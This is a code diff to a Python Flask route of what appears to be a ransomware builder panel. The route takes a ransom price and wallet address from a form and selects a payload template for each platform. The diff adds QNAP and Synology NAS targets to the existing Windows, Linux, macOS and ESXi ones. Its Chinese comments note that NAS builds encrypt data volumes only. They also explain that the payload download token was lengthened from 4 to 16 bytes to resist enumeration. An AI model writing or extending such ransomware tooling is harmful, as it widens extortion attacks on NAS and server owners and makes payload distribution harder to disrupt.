@@ -426,14 +426,16 @@ def generate():
         'price': request.form.get('ransom_price',''),
         'wallet': request.form.get('ransom_wallet',''),
     }
-    if plat not in ('win','linux','macos','esxi'):
+    # NAS 只加密数据卷，绝不含系统分区
+    if plat not in ('win','linux','macos','esxi','qnap','synology'):
         return jsonify(ok=False, msg='无效平台')
     ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
     # 载荷文件名是载荷可匿名下载时的唯一屏障（时间戳可枚举），
     # 4 字节仅 32 bit 可暴力枚举；提到 16 字节 = 128 bit。
     tok = secrets.token_hex(16)
-    tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl','esxi':'esxi_payload.tpl'}
-    ext_map = {'win':'.cs','linux':'.py','macos':'.py','esxi':'.sh'}
+    tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl',
+               'esxi':'esxi_payload.tpl','qnap':'qnap_payload.tpl','synology':'synology_payload.tpl'}
+    ext_map = {'win':'.cs','linux':'.py','macos':'.py','esxi':'.sh','qnap':'.sh','synology':'.sh'}
     tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
     if not os.path.exists(tpl_path):
         return jsonify(ok=False, msg='模板文件缺失')
